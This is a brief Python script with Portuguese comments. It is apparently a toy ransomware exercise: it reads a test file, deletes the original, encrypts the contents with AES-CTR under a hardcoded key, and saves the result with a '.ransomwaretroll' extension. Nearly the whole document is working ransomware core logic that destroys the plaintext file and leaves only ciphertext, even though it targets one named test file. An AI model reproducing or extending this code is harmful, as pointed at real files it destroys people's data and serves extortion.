import os
import pyaes

## Abrir arquivo a ser cript

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## Remover arquivo original

os.remove(file_name)

## Definir chave de encript

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar arquivo

crypto_data = aes.encrypt(file_data)

## Salvar arquivo cript

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
